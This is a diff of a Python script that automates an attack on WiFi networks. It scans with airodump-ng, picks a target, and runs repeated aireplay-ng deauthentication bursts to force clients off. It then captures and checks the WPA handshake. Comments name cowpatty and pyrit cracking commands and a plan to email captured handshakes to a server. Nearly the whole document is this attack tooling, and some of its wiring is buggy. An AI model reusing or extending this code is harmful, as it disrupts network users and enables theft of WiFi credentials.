@@ -9,11 +9,16 @@ from subprocess import Popen, call, PIPE
 from signal import SIGINT, SIGTERM
 from xml_arse import xml_parse_focus
 from multiprocessing import Process, Pipe
-##improvements:
+from validate import validate_handshake
+
+####improvements:
+####
+###Add commenting
+###
 ##create temp folders that dont exist make folders that don't exist automatically
 ##
-##xml_write class so that parameters can be adjusted
-##
+#xml_write class so that parameters can be adjusted
+#
 
 target = '/home/odroid/targets/target.xml'
 output_file = '/home/odroid/xmls/'
@@ -22,16 +27,16 @@ handshake = '/home/odroid/hs/'
 
 ##This could be made to be WAAAAAAAY more efficient.....
 def tidy():
-	directory=output_file
+	directory = output_file
 	files_xml = os.listdir(directory)
 	print "removing existing xmls files:", files_xml
 	for file in  files_xml:
 		try:
-			os.remove(directory+"/"+file)        
+			os.remove(directory+file)        
 		except OSError:
 			pass
 	directory = '/home/odroid/targets'
-	files_targets= os.listdir(directory)
+	files_targets = os.listdir(directory)
 	print "removing existing target files:", files_targets
 	for file in  files_targets:
 		try:
@@ -39,11 +44,11 @@ def tidy():
 		except OSError:
 			pass
 	directory = handshake
-	files_handshake= os.listdir(directory)
+	files_handshake = os.listdir(directory)
 	print "removing existing handshake files:", files_handshake
 	for file in  files_handshake:
 		try:
-			os.remove(directory+"/"+file)        
+			os.remove(directory+file)        
 		except OSError:
 			pass
 
@@ -92,7 +97,7 @@ def remove_file(filename):
 #when suitable target networks detected stop general scan
 def g_scan(channel=0, iface='wlan1mon', conn=0):
 		print "Starting process airodump-ng"
-		command = ['airodump-ng','-a', '--output-format', 'netxml', '--write-interval', '10', '-w', output_file]
+		command = ['airodump-ng','-a', '--output-format', 'netxml', '--write-interval', '10', '-w', output_file+"g_scan"]
 		if channel != 0:
 			command.append('-c')
 			command.append(str(channel))
@@ -118,8 +123,8 @@ def f_scan(params, iface='wlan1mon', conn=0):
 	print "focussing on wifi network:", params[0]
 	print params[1]
 	print params[2]
-	print "Starting process f_airodump-ng"
-	command = ['airodump-ng', '--output-format', 'netxml', '--write-interval', '10', '-w', handshake]
+	print "Starting focussed packet capture, waiting for handshakes..."
+	command = ['airodump-ng', '--output-format', 'pcap', '--write-interval', '10', '-w', handshake+"hs"]
 	command.append('--essid')
 	command.append(str(params[0]))
 	command.append('--channel')
@@ -142,6 +147,34 @@ def f_scan(params, iface='wlan1mon', conn=0):
 			send_interrupt(proc, PID)	
 			break	
 
+#This could be improved...rushed.
+def deauth(params, iface='wlan1mon', conn=0):
+	#sudo aireplay-ng -b 6A:5F:DB:19:8C:E4  -e vodafone8CE5 --deauth 6 wlan1mon 
+	cmd = ['aireplay-ng']
+	cmd.append('-b')
+	cmd.append(str(params[2])),  # bssid
+	cmd.append('-e') # SSID
+	cmd.append(str(params[0])),  # essid
+	cmd.append('--deauth')
+	cmd.append('6')
+	cmd.append(iface)
+	print "Using command:", cmd 
+	#proc = Popen(cmd, stdout=DN, stderr=DN)
+	scanning = True
+	while True:
+		if scanning == True:
+			proc = Popen(cmd)
+			PID = proc.pid
+			print "deauth PID:", PID
+			proc.wait()
+			scanning = deauth_child_conn.recv()    
+			print "deauth child scanning:", scanning
+		if scanning == False:
+			print "Attempting to terminate process deauth..."
+			send_interrupt(proc, PID)	
+			break	
+		time.sleep(6)
+		
 def watch_this(conn=0):
 	print "Starting watchdoggy.py"
 	command = ['python', 'watchdoggy.py','/home/odroid/xmls',]
@@ -158,7 +191,7 @@ def watch_this(conn=0):
 		if scanning == False:
 			print "Attempting kill process watchdog:", PID
 			send_interrupt(watching, PID)	
-			break		
+			break
 
 if __name__ == '__main__':
 	airodump_parent_conn, airodump_child_conn = Pipe()
@@ -210,27 +243,52 @@ if __name__ == '__main__':
 		print "Suitable network detected:"
 		print "parameters:", parameters
 		f_airodump_parent_conn, f_airodump_child_conn = Pipe()
+		deauth_parent_conn, deauth_child_conn = Pipe()
 		f_airodump = Process(target=f_scan, args=(parameters, 'wlan1mon', airodump_child_conn,))
-		print "Attempting to start focussed attack..."
+		f_deauth = Process(target=deauth, args=(parameters, 'wlan1mon', deauth_child_conn,))
 		scanning = True
+		print "Attempting to start focussed attack..."
+		#start airodump-ng process focussed this time
 		f_airodump.start()
+		#start aireply-ng process with deauth method. This could be more refined to focus on clients
+		print "sending deauth packets..."
+		f_deauth.start()
 		time_started = time.time()
 		print "time_started:", time_started
 		while True:
-			time.sleep(1)
 			f_airodump_parent_conn.send(scanning)
+			deauth_parent_conn.send(scanning)
+			time.sleep(10)
+			hs_dir = handshake
+			files_handshake = os.listdir(hs_dir)
+			for file in files_handshake:
+				handshake_file = (hs_dir+file)        
+			valid = validate_handshake(str(parameters[0]), handshake_file)
 			print "parent scanning:", scanning
 			print time.time() - time_started
 			if time.time() - time_started >= 60:
-				print "times up, aborting focussed scan bitches..."	
+				print "times up, aborting focussed attack..."	
 				scanning = False
-				f_airodump_parent_conn.send(scanning)	
+				f_airodump_parent_conn.send(scanning)
+				deauth_parent_conn.send(scanning)
 				print "parent scanning:", scanning
 				f_airodump_parent_conn.close()
+				deauth_parent_conn.close()
 				time.sleep(2)
-				break			
+				break
+			if valid == True:
+				print "Handshake captured, my job here is done..."	
+				scanning = False
+				f_airodump_parent_conn.send(scanning)
+				deauth_parent_conn.send(scanning)
+				print "parent scanning:", scanning
+				f_airodump_parent_conn.close()
+				deauth_parent_conn.close()
+				time.sleep(2)
+				break
+			##scan pcap file for valid handshake EAPOL packets			
 	else:
-		print "No suitable networks detected"
+		print "No suitable networks detected."
 	print "up to here..."
 	
 
@@ -240,6 +298,9 @@ if __name__ == '__main__':
   #stop foccused attack of airodump
 
 #process handshake file if required
+##cowpatty -r /home/odroid/hs/hs-03.cap -c
+##pyrit -r /home/odroid/hs/hs-03.cap  analyze
+
 
 #export processed handshake file and email to processing server
 
